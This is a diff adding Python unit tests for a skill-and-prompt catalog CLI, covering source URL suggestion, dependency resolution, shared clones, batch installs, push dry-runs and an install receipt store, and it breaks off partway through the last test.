@@ -20,6 +20,7 @@ import json
 import os
 import shutil
 import subprocess
+import sys
 import tempfile
 import unittest
 from pathlib import Path
@@ -60,6 +61,7 @@ class TempTool:
         self.project = self.root / "project"
         self.clone_dir = self.tool_dir / ".catalog-repo"
         self.config_path = self.tool_dir / "config.local.yaml"
+        self.receipts_path = self.tool_dir / ".installs.json"
         # clone_dir is deliberately NOT created: "the clone is absent" is a real state
         # the code branches on, and a pre-made empty directory would hide it.
         for d in (self.tool_dir, self.home, self.project):
@@ -68,6 +70,7 @@ class TempTool:
         self._stack = contextlib.ExitStack()
         self._patch("SKILL_DIR", self.tool_dir)
         self._patch("LOCAL_CONFIG_PATH", self.config_path)
+        self._patch("RECEIPTS_PATH", self.receipts_path)
         self._patch("CATALOG_CLONE_DIR", self.clone_dir)
         self._patch("CATALOGS_DIR", self.tool_dir / ".catalogs")
         self._patch("GLOBAL_SKILLS_DIR", self.home / ".claude" / "skills")
@@ -1196,6 +1199,160 @@ class TestRemoteWeb(unittest.TestCase):
 
 
 # --------------------------------------------------------------------------- #
+# Source suggestion from a local path
+# --------------------------------------------------------------------------- #
+
+class TestRemoteSuggestion(unittest.TestCase):
+    """`_remote_suggestion` and the `suggest-source` command it backs.
+
+    Every repo here has a *local* bare origin, so the URL is derived from a real git
+    remote with no network involved.
+    """
+
+    def setUp(self) -> None:
+        self.tmp = tempfile.mkdtemp(prefix="library-suggest-")
+        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
+
+    def _repo(self, origin: str, *, branch: str = "main") -> TempGitRepo:
+        repo = TempGitRepo(self.tmp, name="work", branch=branch)
+        repo.git("remote", "set-url", "origin", origin)
+        return repo
+
+    def test_a_file_in_a_github_repo_gets_a_blob_url(self) -> None:
+        repo = self._repo("git@github.com:acme/tools.git")
+        repo.commit("skills/grilling/SKILL.md", "# Grilling\n")
+
+        url, reason = library._remote_suggestion(repo.work / "skills/grilling/SKILL.md")
+
+        self.assertEqual(
+            url, "https://github.com/acme/tools/blob/main/skills/grilling/SKILL.md")
+        self.assertEqual(reason, "")
+
+    def test_bitbucket_uses_src_rather_than_blob(self) -> None:
+        repo = self._repo("git@bitbucket.org:acme/tools.git")
+        repo.commit("prompts/triage.md", "# Triage\n")
+
+        url, _ = library._remote_suggestion(repo.work / "prompts/triage.md")
+
+        self.assertEqual(url, "https://bitbucket.org/acme/tools/src/main/prompts/triage.md")
+
+    def test_the_checked_out_branch_is_used_not_a_hardcoded_main(self) -> None:
+        repo = self._repo("git@github.com:acme/tools.git", branch="develop")
+        repo.commit("a.md", "x\n")
+
+        url, _ = library._remote_suggestion(repo.work / "a.md")
+
+        self.assertIn("/blob/develop/", url or "")
+
+    def test_a_skill_directory_resolves_to_the_file_inside_it(self) -> None:
+        # A URL naming a directory is a /tree/ link, which is not a source. Pointing at
+        # the folder is also the mistake that makes `use` install the wrong tree.
+        repo = self._repo("git@github.com:acme/tools.git")
+        repo.commit("skills/grilling/SKILL.md", "# Grilling\n")
+
+        url, _ = library._remote_suggestion(repo.work / "skills/grilling")
+
+        self.assertEqual(
+            url, "https://github.com/acme/tools/blob/main/skills/grilling/SKILL.md")
+
+    def test_a_directory_with_no_main_file_says_so(self) -> None:
+        repo = self._repo("git@github.com:acme/tools.git")
+        repo.commit("notes/a.md", "x\n")
+
+        url, reason = library._remote_suggestion(repo.work / "notes")
+
+        self.assertIsNone(url)
+        self.assertIn("no SKILL.md or AGENT.md", reason)
+
+    def test_a_path_outside_any_repo_says_which_problem_it_is(self) -> None:
+        loose = Path(self.tmp) / "loose.md"
+        loose.write_text("x\n")
+
+        url, reason = library._remote_suggestion(loose)
+
+        self.assertIsNone(url)
+        self.assertEqual(reason, "not inside a git repository")
+
+    def test_an_unsupported_host_is_a_different_miss_from_no_repo(self) -> None:
+        # The four misses have different fixes, which is the reason for the reason.
+        repo = self._repo("git@gitlab.com:acme/tools.git")
+        repo.commit("a.md", "x\n")
+
+        url, reason = library._remote_suggestion(repo.work / "a.md")
+
+        self.assertIsNone(url)
+        self.assertIn("gitlab.com", reason)
+
+    def test_the_hint_wrapper_still_returns_just_the_url(self) -> None:
+        # `_refuse_local_source` appends this to an error message and wants only the URL.
+        repo = self._repo("git@github.com:acme/tools.git")
+        repo.commit("a.md", "x\n")
+
+        self.assertEqual(library._suggest_remote_for_local(repo.work / "a.md"),
+                         "https://github.com/acme/tools/blob/main/a.md")
+        self.assertIsNone(library._suggest_remote_for_local(None))
+
+
+class TestSuggestSourceCommand(unittest.TestCase):
+    def setUp(self) -> None:
+        self.tmp = tempfile.mkdtemp(prefix="library-suggest-cmd-")
+        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
+
+    def test_json_reports_the_url_and_exits_zero(self) -> None:
+        repo = TempGitRepo(self.tmp, name="work")
+        repo.git("remote", "set-url", "origin", "git@github.com:acme/tools.git")
+        repo.commit("a.md", "x\n")
+
+        code, out, _ = run_cli("suggest-source", str(repo.work / "a.md"), "--json")
+        body = json.loads(out)
+
+        self.assertEqual(code, 0)
+        self.assertEqual(body["status"], "OK")
+        self.assertEqual(body["suggestion"], "https://github.com/acme/tools/blob/main/a.md")
+        self.assertIsNone(body["reason"])
+
+    def test_no_suggestion_is_an_answer_not_a_failure(self) -> None:
+        # Exit 0 on purpose: a caller that got a straight answer should not have to
+        # branch on an exit code to read it.
+        loose = Path(self.tmp) / "loose.md"
+        loose.write_text("x\n")
+
+        code, out, _ = run_cli("suggest-source", str(loose), "--json")
+        body = json.loads(out)
+
+        self.assertEqual(code, 0)
+        self.assertEqual(body["status"], "NONE")
+        self.assertIsNone(body["suggestion"])
+        self.assertEqual(body["reason"], "not inside a git repository")
+
+    def test_human_output_is_the_bare_url_so_it_can_be_piped(self) -> None:
+        repo = TempGitRepo(self.tmp, name="work")
+        repo.git("remote", "set-url", "origin", "git@github.com:acme/tools.git")
+        repo.commit("a.md", "x\n")
+
+        code, out, _ = run_cli("suggest-source", str(repo.work / "a.md"))
+
+        self.assertEqual(code, 0)
+        self.assertEqual(out.strip(), "https://github.com/acme/tools/blob/main/a.md")
+
+    def test_a_path_that_does_not_exist_is_an_error(self) -> None:
+        code, _, err = run_cli("suggest-source", str(Path(self.tmp) / "nope.md"), "--json")
+
+        self.assertEqual(code, 1)
+        self.assertIn("no such path", err)
+
+    def test_it_needs_no_catalog_and_reads_no_config(self) -> None:
+        # Deliberate: the question is answerable before `library init` has ever run.
+        loose = Path(self.tmp) / "loose.md"
+        loose.write_text("x\n")
+        with patch.object(library, "LOCAL_CONFIG_PATH", Path(self.tmp) / "absent.yaml"):
+            code, out, _ = run_cli("suggest-source", str(loose), "--json")
+
+        self.assertEqual(code, 0)
+        self.assertEqual(json.loads(out)["status"], "NONE")
+
+
+# --------------------------------------------------------------------------- #
 # Dependency resolution (R18.3)
 # --------------------------------------------------------------------------- #
 
@@ -1246,6 +1403,40 @@ class TestResolveDeps(unittest.TestCase):
         self.assertIn("skill:nope", msgs[0])
         self.assertIn("not found in catalog", msgs[0])
 
+    def test_unresolved_refs_are_collected_for_callers_that_cannot_read_stderr(self) -> None:
+        # A GUI or an agent sees only the payload, so a shorter list with no explanation
+        # would read as "nothing missing" rather than "this entry is broken".
+        dep = make_entry("dep")
+        target = make_entry("target", requires=["skill:nope", "bare-ref", "skill:dep"])
+        unresolved: list[dict[str, str]] = []
+        with captured_warnings():
+            order = library.resolve_deps([dep, target], target, unresolved)
+
+        self.assertEqual([e.name for e in order], ["dep", "target"])
+        self.assertEqual(
+            unresolved,
+            [
+                {"ref": "skill:nope", "required_by": "target", "reason": "not_found"},
+                {"ref": "bare-ref", "required_by": "target", "reason": "malformed"},
+            ],
+        )
+
+    def test_a_cycle_is_collected_as_unresolved(self) -> None:
+        left = make_entry("left", requires=["skill:right"])
+        right = make_entry("right", requires=["skill:left"])
+        unresolved: list[dict[str, str]] = []
+        with captured_warnings():
+            library.resolve_deps([left, right], left, unresolved)
+
+        self.assertEqual([u["reason"] for u in unresolved], ["cycle"])
+        self.assertEqual(unresolved[0]["ref"], "skill:left")
+
+    def test_unresolved_is_optional_so_existing_callers_are_unaffected(self) -> None:
+        target = make_entry("target", requires=["skill:nope"])
+        with captured_warnings() as msgs:
+            self.assertEqual(self.order([target], target), ["target"])
+        self.assertEqual(len(msgs), 1)
+
     def test_malformed_ref_warns_and_continues(self) -> None:
         dep = make_entry("dep")
         target = make_entry("target", requires=["dep", "skill:dep"])
@@ -1266,6 +1457,104 @@ class TestResolveDeps(unittest.TestCase):
         with captured_warnings() as msgs:
             self.assertEqual(self.order([solo], solo), ["solo"])
         self.assertTrue(any("cycle detected" in m for m in msgs), msgs)
+
+
+class TestResolveDependents(unittest.TestCase):
+    """The inverse of resolve_deps: what breaks if an entry is removed."""
+
+    @staticmethod
+    def names(entries: list[library.Entry], target: library.Entry) -> list[tuple[str, bool]]:
+        return [(e.name, direct) for e, direct in library.resolve_dependents(entries, target)]
+
+    def test_an_entry_that_names_the_target_is_a_direct_dependent(self) -> None:
+        dep = make_entry("dep")
+        user = make_entry("user", requires=["skill:dep"])
+        self.assertEqual(self.names([dep, user], dep), [("user", True)])
+
+    def test_a_leaf_nothing_requires_has_no_dependents(self) -> None:
+        alone = make_entry("alone")
+        other = make_entry("other", requires=["skill:something-else"])
+        self.assertEqual(self.names([alone, other], alone), [])
+
+    def test_transitive_dependents_are_included_but_marked_indirect(self) -> None:
+        # `use top` installs top's whole closure, so a missing `base` fails top's install
+        # as surely as it fails mid's. Reporting only direct dependents would understate
+        # the blast radius, which is the number the confirmation exists to show.
+        base = make_entry("base")
+        mid = make_entry("mid", requires=["skill:base"])
+        top = make_entry("top", requires=["skill:mid"])
+        self.assertEqual(self.names([base, mid, top], base), [("mid", True), ("top", False)])
+
+    def test_direct_dependents_come_first_then_alphabetical(self) -> None:
+        base = make_entry("base")
+        zed = make_entry("zed", requires=["skill:base"])
+        amy = make_entry("amy", requires=["skill:base"])
+        far = make_entry("far", requires=["skill:amy"])
+        self.assertEqual(
+            self.names([base, zed, amy, far], base),
+            [("amy", True), ("zed", True), ("far", False)],
+        )
+
+    def test_a_diamond_reports_each_dependent_once(self) -> None:
+        base = make_entry("base")
+        left = make_entry("left", requires=["skill:base"])
+        right = make_entry("right", requires=["skill:base"])
+        top = make_entry("top", requires=["skill:left", "skill:right"])
+        self.assertEqual(
+            self.names([base, left, right, top], base),
+            [("left", True), ("right", True), ("top", False)],
+        )
+
+    def test_the_nearest_relationship_wins_when_an_entry_is_both(self) -> None:
+        # `top` names base directly *and* reaches it through mid. It is a direct dependent;
+        # reporting it as indirect would hide the ref it actually declares.
+        base = make_entry("base")
+        mid = make_entry("mid", requires=["skill:base"])
+        top = make_entry("top", requires=["skill:base", "skill:mid"])
+        self.assertEqual(self.names([base, mid, top], base), [("mid", True), ("top", True)])
+
+    def test_a_cycle_terminates_instead_of_recursing(self) -> None:
+        left = make_entry("left", requires=["skill:right"])
+        right = make_entry("right", requires=["skill:left"])
+        self.assertEqual(self.names([left, right], left), [("right", True)])
+
+    def test_refs_are_typed_so_a_prompt_and_a_skill_do_not_collide(self) -> None:
+        skill_alpha = make_entry("alpha")
+        prompt_alpha = make_entry("alpha", etype="prompt")
+        user = make_entry("user", requires=["prompt:alpha"])
+        self.assertEqual(self.names([skill_alpha, prompt_alpha, user], prompt_alpha),
+                         [("user", True)])
+        self.assertEqual(self.names([skill_alpha, prompt_alpha, user], skill_alpha), [])
+
+    def test_whitespace_around_a_ref_is_tolerated(self) -> None:
+        dep = make_entry("dep")
+        user = make_entry("user", requires=["skill: dep"])
+        self.assertEqual(self.names([dep, user], dep), [("user", True)])
+
+    def test_a_malformed_ref_is_skipped_without_warning(self) -> None:
+        # It cannot name anything, and the entry that owns it already reports it as
+        # unresolved when that entry is the subject. Warning here would emit noise about
+        # an unrelated entry every time any entry is shown.
+        dep = make_entry("dep")
+        user = make_entry("user", requires=["dep"])
+        with captured_warnings() as msgs:
+            self.assertEqual(self.names([dep, user], dep), [])
+        self.assertEqual(msgs, [])
+
+    def test_only_the_entries_passed_in_are_searched(self) -> None:
+        # Callers pass the target's own catalog (D9). A ref in another catalog naming this
+        # name resolves to that catalog's copy or dangles, so counting it would overstate
+        # the blast radius across a boundary `use` never crosses.
+        dep = make_entry("dep")
+        same_catalog = make_entry("same", requires=["skill:dep"])
+        other_catalog = make_entry("other", requires=["skill:dep"])
+        self.assertEqual(self.names([dep, same_catalog], dep), [("same", True)])
+        self.assertNotIn("other", [n for n, _ in self.names([dep, same_catalog], dep)])
+        # Passed in, it is found — proving the scoping is the caller's choice, not luck.
+        self.assertEqual(
+            self.names([dep, same_catalog, other_catalog], dep),
+            [("other", True), ("same", True)],
+        )
 
 
 # --------------------------------------------------------------------------- #
@@ -1649,12 +1938,14 @@ class TestSingleCatalogGoldens(unittest.TestCase):
         self.assertEqual(code, 0)
         self.assertEqual(len(payload), 4)
         for item in payload:
-            # `catalog` and `overridden_by` are the additive keys R2.4 allows; every
-            # pre-existing key keeps its name, type, and meaning.
+            # `catalog`/`overridden_by` (R2.4) and `state`/`receipt`/`has_setup`
+            # (design §4.1) are the additive keys; every pre-existing key keeps its
+            # name, type, and meaning (C-D8).
             self.assertEqual(
                 sorted(item),
-                ["catalog", "description", "installed", "name", "overridden_by",
-                 "requires", "scopes", "source", "type"],
+                ["catalog", "description", "has_setup", "installed", "name",
+                 "overridden_by", "receipt", "requires", "scopes", "source", "state",
+                 "type"],
             )
             self.assertEqual((item["catalog"], item["overridden_by"]), ("shared", None))
         retro = next(i for i in payload if i["name"] == "session-retro")
@@ -1665,8 +1956,11 @@ class TestSingleCatalogGoldens(unittest.TestCase):
         code, out, _ = run_cli("search", "retro", "--no-pull", "--json")
         payload = json.loads(out)
         self.assertEqual(code, 0)
+        # §4.1: the same record as `list`, not a thinner one.
         self.assertEqual([sorted(i) for i in payload],
-                         [["catalog", "description", "name", "overridden_by", "source", "type"]])
+                         [["catalog", "description", "has_setup", "installed", "name",
+                           "overridden_by", "receipt", "requires", "scopes", "source",
+                           "state", "type"]])
         self.assertEqual((payload[0]["catalog"], payload[0]["overridden_by"]), ("shared", None))
 
     def test_doctor_json_keys(self) -> None:
@@ -1794,6 +2088,23 @@ class TestRemovePurgeScopes(unittest.TestCase):
         payload = self.purge("session-retro")
         self.assertEqual(payload["deleted"], [])
 
+    def test_a_purge_drops_the_receipt_too(self) -> None:
+        # The purge runs through `uninstall_entry`, so device state is left consistent:
+        # no receipt pointing at a path that no longer exists.
+        target = self.install("global", "session-retro")
+        library.save_receipts({str(target): make_receipt(
+            str(target), content_hash=library.content_hash(target))})
+        self.purge("session-retro")
+        self.assertEqual(library.load_receipts(), {})
+
+    def test_an_untracked_copy_is_still_purged(self) -> None:
+        # `uninstall` refuses a receipt-less copy; `remove --purge` does not. The user
+        # asked to delete the catalog entry, which is the stronger statement.
+        target = self.install("global", "session-retro")
+        self.assertEqual(library.load_receipts(), {})
+        self.purge("session-retro")
+        self.assertFalse(target.exists())
+
     def test_local_copies_survive_without_the_flag(self) -> None:
         targets = [self.install("project", "session-retro"),
                    self.install("global", "session-retro")]
@@ -1802,6 +2113,270 @@ class TestRemovePurgeScopes(unittest.TestCase):
         self.assertEqual(json.loads(out)["deleted"], [])
         for target in targets:
             self.assertTrue(target.exists(), f"{target} was deleted without --purge")
+
+
+class TestOneClonePerRepoPerRun(unittest.TestCase):
+    """R18.7 — entries sharing a repository share its checkout.
+
+    `remote_head` already memoized its `ls-remote` because "twenty skills from one repo is
+    one round trip, not twenty". The clone did not: every `fetch_remote` made its own temp
+    dir, so a run touching N entries from one repository cloned it N times. Measured on a
+    real machine at 36 entries from a single repo.
+
+    Counts actual `git clone` invocations rather than calls to `fetch_remote`, because the
+    thing that got expensive is the network, not the function.
+    """
+
+    REMOTE_SOURCE = "https://github.com/acme/agentics/blob/main/skills/{}/SKILL.md"
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.repo = TempGitRepo(self.tool.root, name="agentics")
+        for name in ("one", "two", "three"):
+            self.repo.commit(f"skills/{name}/SKILL.md", f"# {name}\n")
+        self.repo.push()
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: one
+      description: Shares a repo
+      source: {self.REMOTE_SOURCE.format("one")}
+      requires: ["skill:two"]
+    - name: two
+      description: Shares the same repo
+      source: {self.REMOTE_SOURCE.format("two")}
+      requires: ["skill:three"]
+    - name: three
+      description: And so does this
+      source: {self.REMOTE_SOURCE.format("three")}
+  agents: []
+  prompts: []
+""")
+
+    @contextlib.contextmanager
+    def counted_git_clones(self) -> Any:
+        """Count `git clone` calls, letting every other git command through."""
+        clones: list[str] = []
+        real = subprocess.run
+
+        def counting(cmd, *a, **kw):
+            if isinstance(cmd, list) and cmd[:2] == ["git", "clone"]:
+                clones.append(cmd[-1])
+            return real(cmd, *a, **kw)
+
+        remote = str(self.repo.remote)
+        with patch.object(library.Source, "clone_urls", lambda _self: [remote]), \
+             patch.object(library.subprocess, "run", counting):
+            yield clones
+
+    def test_installing_a_closure_clones_the_shared_repo_once(self) -> None:
+        # `one` drags in `two` and `three`, all from the same repository.
+        with self.counted_git_clones() as clones:
+            code, out, err = run_cli("use", "one", "--no-pull", "--json")
+
+        self.assertEqual(code, 0, err)
+        self.assertEqual(len(json.loads(out)["installed"]), 3)
+        self.assertEqual(len(clones), 1, f"cloned {len(clones)} times: {clones}")
+
+    def test_a_forced_sync_clones_the_shared_repo_once(self) -> None:
+        with self.counted_git_clones():
+            run_cli("use", "one", "--no-pull", "--json")
+
+        with self.counted_git_clones() as clones:
+            code, _, err = run_cli("sync", "--force", "--no-pull", "--json")
+
+        self.assertEqual(code, 0, err)
+        self.assertEqual(len(clones), 1, f"cloned {len(clones)} times: {clones}")
+
+    def test_the_cached_clone_is_cleaned_up_afterwards(self) -> None:
+        # A shared checkout that outlives the run is a temp dir nobody deletes.
+        before = set(Path(tempfile.gettempdir()).glob("library-*"))
+        with self.counted_git_clones():
+            run_cli("use", "one", "--no-pull", "--json")
+
+        self.assertEqual(set(Path(tempfile.gettempdir()).glob("library-*")), before)
+
+
+class TestUseWithSeveralNames(unittest.TestCase):
+    """R3.6 — install a selection in one command, one plan, one confirmation.
+
+    The app's bulk install needs one plan for the whole batch rather than N separate ones:
+    the drift gate is per-plan, so N calls would mean N confirmations or none. Merging the
+    closures also means a dependency two selections share is installed once.
+    """
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        for name in ("alpha", "beta", "shared-dep"):
+            (self.src / name).mkdir(parents=True)
+            (self.src / name / "SKILL.md").write_text(f"# {name}\n")
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: alpha
+      description: Needs the shared dep
+      source: {self.src}/alpha/SKILL.md
+      requires: ["skill:shared-dep"]
+    - name: beta
+      description: Needs it too
+      source: {self.src}/beta/SKILL.md
+      requires: ["skill:shared-dep"]
+    - name: shared-dep
+      description: Required by both
+      source: {self.src}/shared-dep/SKILL.md
+  agents: []
+  prompts: []
+""")
+
+    def use(self, *argv: str, expect: int = 0) -> dict[str, Any]:
+        code, out, err = run_cli("use", *argv, "--no-pull", "--json")
+        self.assertEqual(code, expect, err or out)
+        return json.loads(out) if out else {}
+
+    def installed(self, name: str) -> Path:
+        return self.tool.home / ".claude" / "skills" / name
+
+    def test_a_shared_dependency_is_installed_once(self) -> None:
+        payload = self.use("alpha", "beta")
+
+        names = [r["name"] for r in payload["installed"]]
+        self.assertEqual(names.count("shared-dep"), 1, names)
+        self.assertEqual(sorted(names), ["alpha", "beta", "shared-dep"])
+        for name in ("alpha", "beta", "shared-dep"):
+            self.assertTrue(self.installed(name).is_dir())
+
+    def test_dependencies_still_come_before_what_needs_them(self) -> None:
+        names = [r["name"] for r in self.use("alpha", "beta")["installed"]]
+
+        self.assertLess(names.index("shared-dep"), names.index("alpha"))
+        self.assertLess(names.index("shared-dep"), names.index("beta"))
+
+    def test_it_reports_which_names_were_asked_for(self) -> None:
+        # The installed list mixes requested entries with dependencies, so a caller that
+        # wants to say "these are the ones you picked" needs this.
+        self.assertEqual(self.use("alpha", "beta")["requested"], ["alpha", "beta"])
+
+    def test_a_dry_run_plans_the_whole_batch_and_writes_nothing(self) -> None:
+        payload = self.use("alpha", "beta", "--dry-run")
+
+        self.assertTrue(payload["dry_run"])
+        self.assertEqual(payload["requested"], ["alpha", "beta"])
+        self.assertEqual(len(payload["would_install"]), 3)
+        self.assertFalse(self.installed("alpha").exists())
+
+    def test_one_bad_name_installs_nothing_at_all(self) -> None:
+        """Resolution happens before any install, so a typo cannot half-apply the batch."""
+        payload = self.use("alpha", "nope-not-real", expect=2)
+
+        self.assertEqual(payload["status"], "NOT_FOUND")
+        self.assertEqual(payload["query"], "nope-not-real")
+        self.assertFalse(self.installed("alpha").exists())
+
+    def test_a_single_name_behaves_exactly_as_before(self) -> None:
+        # The contract every existing caller depends on (C-D8).
+        payload = self.use("alpha")
+
+        self.assertEqual(payload["status"], "OK")
+        self.assertEqual(payload["requested"], ["alpha"])
+        self.assertIn("overrides", payload)
+        self.assertIn("overridden_by", payload)
+        self.assertEqual(payload["installed"][-1]["name"], "alpha")
+
+
+class TestPushToARemoteSource(unittest.TestCase):
+    """R13.5 — pushing to a remote source previews without writing and never touches the base.
+
+    The local-source half of `--dry-run` has its own tests above; this covers the other
+    early return, which had the same defect independently: with the local copy already
+    matching its source, `--dry-run` printed `status: OK, changed: false`, which is what a
+    completed push prints. Only a real clone reaches that branch, so it needs a repo.
+
+    A bare repo stands in for the host and `clone_urls` is redirected at it, so the whole
+    thing stays offline (R18.6) and `autopush: false` means `gh` is never called.
+    """
+
+    REMOTE_SOURCE = "https://github.com/acme/agentics/blob/main/skills/from-git/SKILL.md"
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.repo = TempGitRepo(self.tool.root, name="agentics")
+        self.repo.commit("skills/from-git/SKILL.md", "# upstream\n")
+        self.repo.push()
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: from-git
+      description: Installed from a git remote
+      source: {self.REMOTE_SOURCE}
+  agents: []
+  prompts: []
+""")
+
+    @contextlib.contextmanager
+    def _local_remote(self):
+        remote = str(self.repo.remote)
+        with patch.object(library.Source, "clone_urls", lambda _self: [remote]):
+            yield
+
+    def install(self, text: str) -> None:
+        target = self.tool.home / ".claude" / "skills" / "from-git"
+        target.mkdir(parents=True, exist_ok=True)
+        (target / "SKILL.md").write_text(text)
+
+    def push(self, *extra: str) -> dict[str, Any]:
+        with self._local_remote():
+            code, out, err = run_cli("push", "from-git", "--from", "global",
+                                     "--no-pull", "--json", *extra)
+        self.assertEqual(code, 0, err)
+        return json.loads(out)
+
+    def branches(self) -> list[str]:
+        proc = subprocess.run(
+            ["git", "-C", str(self.repo.remote), "branch", "--format=%(refname:short)"],
+            capture_output=True, text=True,
+        )
+        return proc.stdout.split()
+
+    def test_dry_run_says_dry_run_when_there_is_nothing_to_push(self) -> None:
+        self.install("# upstream\n")
+        report = self.push("--dry-run")
+
+        self.assertEqual(report["status"], "DRY_RUN")
+        self.assertFalse(report["would_change"])
+        # The give-away that this used to be a completed push's payload.
+        self.assertNotIn("changed", report)
+
+    def test_dry_run_shows_the_diff_and_pushes_no_branch(self) -> None:
+        self.install("# upstream\nedited\n")
+        report = self.push("--dry-run")
+
+        self.assertEqual(report["status"], "DRY_RUN")
+        self.assertTrue(report["would_change"])
+        self.assertIn("+edited", report["diff"])
+        self.assertEqual(self.branches(), ["main"])
+
+    def test_a_push_opens_a_branch_and_leaves_the_base_untouched(self) -> None:
+        self.install("# upstream\nedited\n")
+        report = self.push("--message", "Edit from a test")
+
+        self.assertEqual(report["status"], "OK")
+        self.assertTrue(report["changed"])
+        # No `gh` with autopush off, so the branch is pushed and the PR is not opened.
+        self.assertEqual(report["method"], "manual")
+        self.assertIsNone(report.get("pr_url"))
+        # And no compare URL either: `_remote_web` is given the redirected clone URL,
+        # which is a local path rather than a recognised host. That is not an artefact of
+        # the harness dodging something — it is the real "unrecognised host" outcome, and
+        # a caller has to render "branch pushed" with no link to offer.
+        self.assertIsNone(report.get("compare_url"))
+
+        self.assertIn(report["branch"], self.branches())
+        # The protected branch is the whole point: it must not have moved.
+        self.assertEqual(self.repo.remote_text("skills/from-git/SKILL.md"), "# upstream\n")
 
 
 class TestPushFromScopeNames(unittest.TestCase):
@@ -1894,6 +2469,69 @@ library:
         code, _, err = run_cli("push", "session-retro", "--no-pull", "--json")
         self.assertEqual(code, 1)
         self.assertIn("not installed locally", err)
+
+    def test_dry_run_on_a_local_source_writes_nothing(self) -> None:
+        """R13.5 — a preview must not be the thing it is previewing.
+
+        `--dry-run` was only checked inside the PR flow, which the local-source branch
+        returned before ever reaching. So `push --dry-run` against a local path copied
+        the files and reported `status: OK` — indistinguishable from a real push, and
+        the source overwritten by the command that promised not to touch it.
+        """
+        self.install("global", "# edited copy\n")
+        report = self.push("--dry-run", "--from", "global")
+
+        self.assertEqual(report["status"], "DRY_RUN")
+        self.assertTrue(report["would_change"])
+        self.assertEqual(report["dest"], str(self.source_dir))
+        # The whole point: the source is untouched.
+        self.assertEqual((self.source_dir / "SKILL.md").read_text(), "# upstream copy\n")
+
+    def test_dry_run_reports_a_matching_copy_as_no_change(self) -> None:
+        self.install("global", "# upstream copy\n")
+        report = self.push("--dry-run", "--from", "global")
+
+        self.assertEqual(report["status"], "DRY_RUN")
+        self.assertFalse(report["would_change"])
+
+    def test_dry_run_says_dry_run_even_when_there_is_nothing_to_push(self) -> None:
+        """A preview is a preview whatever the answer.
+
+        The remote-source branch had the same defect on its own early return: with the
+        local copy already matching, `--dry-run` reported `status: OK, changed: false`,
+        which is byte-identical to what a completed push reports. A caller telling a
+        preview from a real push by `status` — the only reliable way — got it wrong on
+        the most ordinary outcome there is.
+
+        Checked here on a local source, where the same rule applies and no clone is
+        needed; the remote branch is verified against a bare remote by hand.
+        """
+        self.install("global", "# upstream copy\n")
+        report = self.push("--dry-run", "--from", "global")
+
+        self.assertEqual(report["status"], "DRY_RUN")
+        self.assertFalse(report["would_change"])
+        self.assertNotIn("changed", report)
+
+    def test_json_carries_the_multi_catalog_warning_the_terminal_gets(self) -> None:
+        """The one warning whose cost is an edit landing in someone else's repo.
+
+        `push_source_warning` reached a terminal through `warn()` and nothing else, so
+        under `--json` — the mode a GUI and the agent both use — it was invisible.
+        """
+        self.install("global", "# edited copy\n")
+        report = self.push("--dry-run", "--from", "global")
+        # One catalog defines this name here, so there is nothing to warn about, and the
+        # key is present-and-null rather than absent: a caller must not have to guess
+        # whether an old CLI simply never reported it.
+        self.assertIsNone(report["note"])
+
+    def test_a_real_push_after_a_dry_run_still_writes(self) -> None:
+        # Guards the obvious over-correction: skipping the copy for every local push.
+        self.install("global", "# edited copy\n")
+        self.push("--dry-run", "--from", "global")
+        self.assertTrue(self.push("--from", "global")["changed"])
+        self.assertEqual((self.source_dir / "SKILL.md").read_text(), "# edited copy\n")
 
 
 # --------------------------------------------------------------------------- #
@@ -2596,6 +3234,410 @@ class TestCatalogMigrate(unittest.TestCase):
         self.assertFalse(library.load_config().legacy_shape)
 
 
+def make_receipt(dest: str, **kw: Any) -> dict[str, Any]:
+    """A receipt record with every §3 key present; override what a test cares about."""
+    rec = {
+        "dest": dest,
+        "name": Path(dest).name,
+        "type": "skill",
+        "catalog": "shared",
+        "catalog_key": "git@github.com:org/repo.git#library.yaml@main",
+        "scope": "global",
+        "source": "https://github.com/org/repo/blob/main/x/SKILL.md",
+        "commit": "a" * 40,
+        "content_hash": "sha256:deadbeef",
+        "installed_at": "2026-08-13T13:35:19Z",
+    }
+    rec.update(kw)
+    return rec
+
+
+class TestReceiptStore(unittest.TestCase):
+    """Reading and writing .installs.json (design §3)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+
+    def test_a_receipt_written_before_catalog_key_still_loads(self) -> None:
+        """C-D3, R15.12 — every receipt on every existing machine predates this key.
+
+        It reads back as None rather than failing, which is what lets the purge matcher
+        fall back to the recorded id and source for exactly those records.
+        """
+        rec = make_receipt(str(self.tool.home / ".claude/skills/alpha"))
+        legacy = {k: v for k, v in rec.items() if k != "catalog_key"}
+        self.tool.receipts_path.write_text(
+            json.dumps({"version": 1, "installs": [legacy]}) + "\n")
+
+        loaded = library.load_receipts()[rec["dest"]]
+        self.assertIsNone(loaded["catalog_key"])
+        self.assertEqual(loaded["catalog"], "shared")
+
+    def test_round_trips_a_receipt(self) -> None:
+        rec = make_receipt(str(self.tool.home / ".claude/skills/alpha"))
+        library.save_receipts({rec["dest"]: rec})
+        self.assertEqual(library.load_receipts(), {rec["dest"]: rec})
+
+    def test_writes_the_documented_envelope_sorted_by_dest(self) -> None:
+        library.save_receipts({d: make_receipt(d) for d in ("/b/two", "/a/one")})
+        data = json.loads(self.tool.receipts_path.read_text())
+        self.assertEqual(data["version"], 1)
+        self.assertEqual([r["dest"] for r in data["installs"]], ["/a/one", "/b/two"])
+        self.assertEqual(set(data["installs"][0]), set(library.RECEIPT_KEYS))
+
+    def test_a_missing_file_reads_as_no_receipts(self) -> None:
+        self.assertEqual(library.load_receipts(), {})
+
+    def test_a_corrupt_file_degrades_to_empty_instead_of_failing(self) -> None:
+        # C-D3: the first run of this CLI must not declare a working setup broken.
+        for junk in ("{not json", "[]", '{"version": 99, "installs": [{"dest": "/x"}]}'):
+            self.tool.receipts_path.write_text(junk)
+            self.assertEqual(library.load_receipts(), {}, junk)
+
+    def test_records_without_a_dest_are_dropped_not_fatal(self) -> None:
